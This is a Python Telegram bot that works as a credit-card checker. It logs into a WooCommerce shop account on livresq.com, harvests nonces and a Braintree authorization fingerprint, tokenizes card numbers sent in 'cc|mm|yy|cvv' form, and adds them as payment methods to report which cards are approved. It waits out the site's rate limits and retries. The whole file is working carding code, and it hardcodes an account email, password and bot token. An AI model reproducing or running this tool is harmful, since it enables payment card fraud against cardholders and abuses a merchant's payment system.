import requests
import re
import base64
import json
import uuid
import asyncio
import aiohttp
import time
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ---------- YOUR CREDENTIALS (keep safe) ----------
EMAIL = "latoh66921@aratrin.com"
PASSWORD = "Ajaykumar@28"
BOT_TOKEN = "7033106060:AAHXbgIlI7iMngcRw543ONGUvFzt-TTOvbM"
ALLOWED_USER_ID = 2117119246

logging.basicConfig(level=logging.INFO)

# ---------- HEADER FUNCTIONS ----------
def h1():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h2():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h3():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/payment-methods/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h4():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def ajax_h():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i',
    }

def bt_h(fp):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {fp}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

def login():
    """Improved login with retry logic and proper status code handling"""
    try:
        s = requests.Session()
        
        # Step 1: Get login page
        print("📍 Step 1: Fetching login page...")
        r = s.get('https://livresq.com/en/my-account/', headers=h1(), timeout=10)
        print(f"   Status: {r.status_code}")
        
        if r.status_code == 503:
            print("⚠️  SERVER UNAVAILABLE (503) - Website is temporarily down. Try again later.")
            return None
        
        if r.status_code != 200:
            print(f"❌ Failed to get login page. Status: {r.status_code}")
            return None
        
        # Extract nonce
        n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
        if not n:
            print("❌ LOGIN ERROR: Could not extract login nonce")
            return None
        
        print("✅ Login Nonce found")
        
        # Step 2: Submit login credentials
        print("📍 Step 2: Submitting login credentials...")
        d = {
            'username': EMAIL,
            'password': PASSWORD,
            'woocommerce-login-nonce': n.group(1),
            '_wp_http_referer': '/en/contul-meu/',
            'login': 'Log in',
            'trp-form-language': 'en'
        }
        
        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d, timeout=10)
        print(f"   Status: {r.status_code}")
        
        # Handle 503 error
        if r.status_code == 503:
            print("⚠️  SERVER UNAVAILABLE (503) - Website is temporarily down. Try again later.")
            return None
        
        if r.status_code != 200:
            print(f"❌ Login POST failed. Status: {r.status_code}")
            return None
        
        # Check for explicit error messages
        if 'woocommerce-error' in r.text:
            print("❌ LOGIN ERROR: WooCommerce error detected")
            error_match = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
            if error_match:
                error_msg = re.sub(r'<[^>]+>', '', error_match.group(1).strip())
                print(f"   Error: {error_msg}")
            return None
        
        # Verify login success
        print("📍 Step 3: Verifying login...")
        
        # Check for logout button
        if re.search(r'<a[^>]*href="[^"]*logout[^"]*"[^>]*>.*?Log\s*Out|Logout', r.text, re.IGNORECASE):
            print("✅ LOGIN SUCCESSFUL - Logout button found!")
            return s
        
        # Check for account navigation
        if 'woocommerce-MyAccount-navigation' in r.text or 'customer-logout' in r.text:
            print("✅ LOGIN SUCCESSFUL - Account page detected!")
            return s
        
        print("❌ LOGIN ERROR: Could not verify login status")
        print(f"   URL after login: {r.url}")
        return None
            
    except requests.exceptions.Timeout:
        print("❌ LOGIN ERROR: Request timeout - server not responding")
        return None
    except requests.exceptions.ConnectionError:
        print("❌ LOGIN ERROR: Connection failed - check internet connection")
        return None
    except Exception as e:
        print(f"❌ LOGIN ERROR: {str(e)}")
        return None

def get_nonces(s):
    """Extract nonces from add payment method page"""
    try:
        print("📍 Fetching nonces...")
        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3(), timeout=10)
        
        if r.status_code == 503:
            print("⚠️  SERVER UNAVAILABLE (503)")
            return None, None
        
        if r.status_code != 200:
            print(f"❌ Failed to get nonces page. Status: {r.status_code}")
            return None, None
        
        # Extract add payment method nonce
        an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
        if an:
            print("   ✅ Add Nonce found")
        else:
            print("   ❌ Add Nonce NOT FOUND")
        
        # Extract client token nonce
        cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
        if not cn:
            cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
        
        if cn:
            print("   ✅ Client Nonce found")
        else:
            print("   ❌ Client Nonce NOT FOUND")
        
        if not an or not cn:
            return None, None
        
        return an.group(1), cn.group(1)
    except requests.exceptions.Timeout:
        print("❌ ERROR in get_nonces: Request timeout")
        return None, None
    except Exception as e:
        print(f"❌ ERROR in get_nonces: {str(e)}")
        return None, None

def get_fp(s, cn):
    """Get authorization fingerprint from Braintree"""
    if not cn:
        print("❌ ERROR: Client nonce is None")
        return None
    
    try:
        print("📍 Getting fingerprint...")
        d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn}
        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d, timeout=10)
        
        if r.status_code == 503:
            print("⚠️  SERVER UNAVAILABLE (503)")
            return None
        
        if r.status_code != 200:
            print(f"❌ ERROR: Status code {r.status_code}")
            return None
        
        j = r.json()
        if 'data' not in j:
            print("❌ ERROR: No 'data' field in response")
            return None
        
        dt = base64.b64decode(j['data']).decode('utf-8')
        fp = json.loads(dt).get('authorizationFingerprint')
        
        if fp:
            print("   ✅ Fingerprint obtained")
            return fp
        else:
            print("❌ ERROR: Could not extract fingerprint")
            return None
            
    except requests.exceptions.Timeout:
        print("❌ ERROR in get_fp: Request timeout")
        return None
    except Exception as e:
        print(f"❌ ERROR in get_fp: {str(e)}")
        return None

async def tok(fp, cc, mm, yy, cv):
    """Tokenize credit card via Braintree GraphQL"""
    try:
        print("📍 Tokenizing card...")
        async with aiohttp.ClientSession() as ses:
            sid = str(uuid.uuid4())
            q = {
                'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
                'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                    }
                }''',
                'variables': {
                    'input': {
                        'creditCard': {'number':cc,'expirationMonth':mm,'expirationYear':yy,'cvv':cv},
                        'options': {'validate': False}
                    }
                },
                'operationName': 'TokenizeCreditCard'
            }
            async with ses.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                if resp.status != 200:
                    print(f"   ❌ ERROR: Braintree status code {resp.status}")
                    return None
                
                res = await resp.json()
                token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
                
                if token:
                    print("   ✅ Token generated")
                    return token
                else:
                    print("   ❌ ERROR: Could not generate token")
                    return None
                    
    except asyncio.TimeoutError:
        print("   ❌ ERROR in tok: Request timeout")
        return None
    except Exception as e:
        print(f"   ❌ ERROR in tok: {str(e)}")
        return None

def add_pm(s, pt, an):
    """Add payment method to account"""
    for attempt in range(4):
        try:
            print(f"📍 Adding payment method (attempt {attempt + 1}/4)...")
            pd = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': pt,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': an,
                '_wp_http_referer': '/en/contul-meu/add-payment-method/',
                'woocommerce_add_payment_method': '1',
                'trp-form-language': 'en'
            }
            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd, timeout=10)
            
            if r.status_code == 503:
                print("   ⚠️  SERVER UNAVAILABLE (503) - Waiting 15s...")
                time.sleep(15)
                continue
            
            # Rate limiting check
            if 'You cannot add a new payment method so soon' in r.text:
                print(f"   ⏱️  Rate limited - Waiting 15s...")
                time.sleep(15)
                continue
            
            # Error check
            em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
            if em:
                et = re.sub(r'\s+', ' ', em.group(1).strip())
                et = re.sub(r'&nbsp;', ' ', et)
                print(f"   ❌ Card Error: {et}")
                return False, et
            
            # Success check
            if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
                print("   ✅ CARD APPROVED")
                return True, "APPROVED"
            
            # Message check
            sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
            if sm:
                st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
                st = re.sub(r'\s+', ' ', st)
                print(f"   ✅ Card Response: {st}")
                return True, st
            
            # Wait before retry
            if attempt < 3:
                print("   ⏱️  Waiting 15s before retry...")
                time.sleep(15)
                
        except requests.exceptions.Timeout:
            print(f"   ⚠️  Request timeout - Waiting 15s...")
            time.sleep(15)
        except Exception as e:
            print(f"   ❌ ERROR in add_pm: {str(e)}")
    
    print("   ❌ Unknown error after retries")
    return False, "UNKNOWN"

async def proc(s, cc, mm, yy, cv):
    """Main processing function"""
    print("\n--- 🎯 Starting Card Processing ---")
    
    an, cn = get_nonces(s)
    if not an or not cn:
        return False, "NONCES FAILED"
    
    fp = get_fp(s, cn)
    if not fp:
        return False, "FINGERPRINT FAILED"
    
    pt = await tok(fp, cc, mm, yy, cv)
    if not pt:
        return False, "TOKENIZE FAILED"
    
    return add_pm(s, pt, an)

# ---------- TELEGRAM HANDLER ----------
async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if ALLOWED_USER_ID and user_id != ALLOWED_USER_ID:
        await update.message.reply_text("Unauthorized user.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /check <card_number|expiry_month|expiry_year|cvv>")
        return

    raw = ' '.join(context.args).strip()
    parts = raw.split('|')
    if len(parts) != 4:
        await update.message.reply_text("Invalid format. Use: /check 4111111111111111|12|26|123")
        return

    cc, mes, ano, cvv = [p.strip() for p in parts]

    # Validate digit lengths (basic)
    if not (cc.isdigit() and mes.isdigit() and ano.isdigit() and cvv.isdigit()):
        await update.message.reply_text("All fields must be numeric.")
        return

    await update.message.reply_text("⏳ Processing card... (this may take 30-60s)")

    try:
        s = login()
        if not s:
            await update.message.reply_text("❌ LOGIN FAILED")
            return
        
        ok, msg = await proc(s, cc, mes, ano, cvv)
        if ok:
            await update.message.reply_text(f"✅ Response: {msg}")
        else:
            await update.message.reply_text(f"❌ Response: {msg}")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")

# ---------- MAIN ----------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("check", check_card))
    print("🤖 Bot is running... Press Ctrl+C to stop")
    app.run_polling()

if __name__ == "__main__":
    main()
